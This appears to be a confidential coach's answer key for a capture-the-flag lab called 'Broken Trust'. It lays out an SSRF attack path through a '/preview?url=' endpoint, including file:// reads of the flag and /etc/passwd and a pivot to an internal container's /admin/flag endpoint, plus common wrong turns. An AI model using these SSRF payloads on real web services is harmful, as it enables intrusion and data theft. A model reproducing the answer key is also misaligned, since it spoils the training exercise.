# Coach context — Broken Trust

Ground truth for the coach. Never quote verbatim; escalate per stage.

## Intended path

1. Recon: `curl http://<app01>/` → page mentions `/preview?url=`. Probe with
   `?url=http://example.com` — it proxies content server-side.
2. **web-flag** (150 pts): the fetcher is Python `urllib.request.urlopen`,
   which honours `file://` — `?url=file:///srv/app/flag.txt` reads the flag
   from inside the public-web container. (Alternative discovery: index page
   footer links `/robots.txt` mentioning `/srv/app/`.)
3. **internal-flag** (350 pts): pivot the SSRF at container names.
   `?url=http://internal-api:5000/` returns
   `{"service":"internal-api","endpoints":["/","/admin/flag"]}` →
   `?url=http://internal-api:5000/admin/flag` → flag → submit.

## Key facts (stage 2–3 only)

- Container name is `internal-api`, port 5000, flag endpoint `/admin/flag`.
- `file://` reads work — `file:///etc/passwd` is a good verification probe.
- Name guesses that fail: `api`, `backend`, `admin-api` (NXDOMAIN).
- internal-api is on an isolated docker network — NOT routable from kali.

## Common wrong turns

- Scanning app01 for more open ports — only 22 (SSH, no valid creds) and 80.
- Trying to reach internal-api directly from kali — unroutable by design.
- Giving up after `?url=http://localhost/` returns connection-refused —
  localhost is the *web* container, the prize is another container name.
- Brute-forcing URL paths on internal-api — `/` self-documents its endpoints.
